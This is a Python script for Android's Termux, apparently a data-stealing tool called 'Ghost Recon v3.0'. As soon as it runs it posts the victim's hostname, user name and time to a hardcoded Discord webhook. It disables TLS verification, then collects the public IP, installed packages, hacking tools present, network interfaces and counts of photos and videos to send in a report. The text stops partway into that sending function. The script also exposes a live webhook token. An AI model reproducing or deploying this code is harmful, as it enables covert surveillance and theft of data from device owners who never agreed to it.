#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX GHOST RECON v3.0                       ║
# ║        IMMEDIATE DISCORD NOTIFICATION ON START           ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ CONFIGURATION - CHANGE THIS ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"  # ⬅️ PUT YOUR WEBHOOK HERE

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
from datetime import datetime
import hashlib

# ════════ IMMEDIATE NOTIFICATION ON START ════════
def immediate_notification():
    """Send immediate notification when script starts"""
    print("╔══════════════════════════════════════════════════════════╗")
    print("║               GHOST RECON v3.0 - STARTING                ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print("\n[🔥] SENDING IMMEDIATE STARTUP NOTIFICATION...")
    
    # Get basic info for notification
    hostname = socket.gethostname()
    username = getpass.getuser()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create startup message
    startup_message = {
        "content": f"""
🚀 **GHOST RECON v3.0 ACTIVATED** 🚀
**Target:** `{hostname}`
**User:** `{username}`
**Activation Time:** `{current_time}`
**Status:** `SYSTEM PENETRATION INITIATED`

🔴 **IMMEDIATE NOTIFICATION - SCRIPT STARTED**
✅ **This confirms the script is RUNNING**
📡 **Next: Full system reconnaissance...**

🔥 **OPERATOR:** M1 EZ HAING NOW PH
⚡ **TOOL:** TERMUX GHOST RECON v3.0
🎯 **MISSION:** SYSTEM INTELLIGENCE GATHERING
        """,
        "username": "Ghost Recon v3.0",
        "avatar_url": "https://i.imgur.com/7QqQjqG.png"
    }
    
    try:
        # Disable SSL verification
        ssl._create_default_https_context = ssl._create_unverified_context
        
        # Send the message
        data = json.dumps(startup_message, ensure_ascii=False).encode('utf-8')
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Ghost Recon v3.0)'
        }
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=10)
        
        if response.status in [200, 204]:
            print("[✅] STARTUP NOTIFICATION SENT SUCCESSFULLY!")
            print("[✅] Check Discord NOW - You should see this message!")
            return True
        else:
            print(f"[❌] Startup failed: HTTP {response.status}")
            return False
            
    except urllib.error.HTTPError as e:
        print(f"[❌] HTTP Error: {e.code} - {e.reason}")
        if e.code == 404:
            print("[❌] WEBHOOK NOT FOUND - Check the URL!")
        return False
        
    except urllib.error.URLError as e:
        print(f"[❌] URL Error: {e.reason}")
        print("[❌] NO INTERNET CONNECTION!")
        return False
        
    except Exception as e:
        print(f"[❌] Error: {str(e)[:50]}")
        return False

# ════════ VERIFY WEBHOOK ════════
def verify_webhook():
    """Verify webhook before doing anything"""
    print("\n[🔍] VERIFYING WEBHOOK CONFIGURATION...")
    
    if WEBHOOK_URL == "YOUR_NEW_WEBHOOK_URL_HERE":
        print("[❌] ERROR: You didn't change the webhook URL!")
        print("[❌] Replace 'YOUR_NEW_WEBHOOK_URL_HERE' with your actual Discord webhook")
        print("[❌] Get a new webhook from Discord: Server Settings → Integrations → Webhooks")
        return False
    
    if "discord.com/api/webhooks/" not in WEBHOOK_URL:
        print("[❌] ERROR: Webhook URL doesn't look like a Discord webhook!")
        print("[❌] Format should be: https://discord.com/api/webhooks/ID/TOKEN")
        return False
    
    print("[✅] Webhook URL format is correct")
    print("[✅] Attempting to send test message...")
    return True

# ════════ COLLECT SYSTEM INTELLIGENCE ════════
def collect_intelligence():
    """Collect comprehensive system intelligence"""
    print("\n[🕵️] COLLECTING SYSTEM INTELLIGENCE...")
    
    intel = {}
    
    # Basic Information
    intel['basic'] = {
        'victim_id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
        'timestamp': datetime.now().isoformat(),
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'platform': platform.platform(),
        'python_version': platform.python_version(),
        'current_dir': os.getcwd()
    }
    
    # Public IP
    print("  → Getting public IP address...")
    try:
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com']
        for service in ip_services:
            try:
                intel['basic']['public_ip'] = urllib.request.urlopen(service, timeout=5).read().decode().strip()
                print(f"  [✓] IP: {intel['basic']['public_ip']}")
                break
            except:
                continue
    except:
        intel['basic']['public_ip'] = "Unknown"
    
    # Termux Packages
    print("  → Scanning installed packages...")
    intel['packages'] = []
    try:
        result = subprocess.run(
            "apt list --installed 2>/dev/null | head -25",
            shell=True, capture_output=True, text=True, timeout=10
        )
        if result.stdout:
            packages = result.stdout.strip().split('\n')[1:20]
            intel['packages'] = packages
            print(f"  [✓] Found {len(packages)} packages")
    except:
        pass
    
    # Hacking Tools
    print("  → Detecting security tools...")
    intel['tools'] = []
    tool_list = ['nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
                 'john', 'hashcat', 'wireshark', 'adb', 'python3',
                 'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump']
    
    for tool in tool_list:
        try:
            result = subprocess.run(
                f"which {tool} 2>/dev/null || command -v {tool}",
                shell=True, capture_output=True, text=True, timeout=2
            )
            if result.returncode == 0:
                intel['tools'].append(tool)
        except:
            pass
    
    print(f"  [✓] Found {len(intel['tools'])} security tools")
    
    # Storage Analysis
    print("  → Analyzing storage...")
    intel['storage'] = {}
    try:
        import shutil
        paths = [('/', 'Root'), ('/sdcard', 'External Storage')]
        for path, name in paths:
            if os.path.exists(path):
                try:
                    usage = shutil.disk_usage(path)
                    intel['storage'][name] = {
                        'total_gb': usage.total // (1024**3),
                        'free_gb': usage.free // (1024**3),
                        'used_gb': usage.used // (1024**3)
                    }
                except:
                    pass
    except:
        pass
    
    # Network Information
    print("  → Gathering network data...")
    intel['network'] = {}
    try:
        # Network interfaces
        result = subprocess.run(
            "ip addr show 2>/dev/null || ifconfig 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=5
        )
        if result.stdout:
            intel['network']['interfaces'] = result.stdout.strip().split('\n')[:15]
    except:
        pass
    
    # Photos Count
    print("  → Searching for media files...")
    intel['media'] = {'photos': 0, 'videos': 0}
    try:
        # Count photos
        result = subprocess.run(
            "find /sdcard -name '*.jpg' -o -name '*.png' 2>/dev/null | wc -l",
            shell=True, capture_output=True, text=True, timeout=5
        )
        if result.stdout:
            intel['media']['photos'] = int(result.stdout.strip())
        
        # Count videos
        result = subprocess.run(
            "find /sdcard -name '*.mp4' -o -name '*.avi' 2>/dev/null | wc -l",
            shell=True, capture_output=True, text=True, timeout=5
        )
        if result.stdout:
            intel['media']['videos'] = int(result.stdout.strip())
    except:
        pass
    
    print(f"  [✓] Photos: {intel['media']['photos']}, Videos: {intel['media']['videos']}")
    
    print("[✅] INTELLIGENCE COLLECTION COMPLETE!")
    return intel

# ════════ SEND INTELLIGENCE REPORT ════════
def send_intelligence_report(intel):
    """Send comprehensive intelligence report"""
    print("\n[📤] SENDING INTELLIGENCE REPORT TO DISCORD...")
    
